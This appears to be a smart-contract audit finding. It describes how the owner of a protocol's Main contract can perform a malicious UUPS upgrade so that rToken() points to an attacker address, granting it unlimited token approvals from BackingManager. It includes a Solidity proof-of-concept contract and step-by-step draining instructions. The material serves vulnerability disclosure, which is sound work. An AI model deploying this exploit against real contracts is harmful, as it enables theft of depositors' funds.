# Vulnerability details

// The Ackee audit was insufficient in its reporting of this bug.  The mitigation of this bug is extremely simple as detailed below and does not require the BackingManager contract to operate with necessary, limited approvals.  Moreover, the triviality by which the owner can upgrade main and change the logic of main.rToken() was not mentioned. 

## Impact

An owner can steal all funds stored in **BackingManager** by performing a malicious upgrade.  An owner is an EOA or a contract that deployed an instance of the protocol.  **BackingManager** directly calls **main.rToken()** in **grantRTokenAllowance()**.

        function grantRTokenAllowance(IERC20 erc20) external notPausedOrFrozen {
            require(assetRegistry.isRegistered(erc20), "erc20 unregistered");
            // == Interaction ==
            IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), 0);
            IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), type(uint256).max);
        }

**Main** overrides the virtual function **_authorizeUpgrade** from **UUPSUpgradeable**, making it so only the **owner** of **main** can upgrade it. The owner therefore can upgrade **main.rToken()** to return any address that they control, granting it the max token approval for ***any*** ERC20 on behalf of the backingManager. 

## Proof of Concept

    // SPDX-License-Identifier: BlueOak-1.0.0
    pragma solidity 0.8.9;

    import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
    import "../mixins/ComponentRegistry.sol";

    contract MaliciousUpgrade is UUPSUpgradeable {

        address public exploiter;

        function initMalicious() external {
            // Random Etherscan address...
            exploiter = 0x9057A7823db1Ccd6887BD58B05f54Baa1BA8fAb4; 
        }

        function rToken() external view returns (address) {
            return exploiter;
        }

        function pausedOrFrozen() external pure returns (bool) {
            return false;
        }

         function _authorizeUpgrade(address) internal override virtual {}
     }

1.  Deploy the above MaliciousUpgrade contract, setting the exploiter address to an EOA that you control
2.  Upgrade main to the MaliciousUpgrade contract
3.  Call grantRTokenAllowance() with the various ERC20s stored in BackingManager 
4.  Transfer the ERC20s to your EOA by calling transferFrom

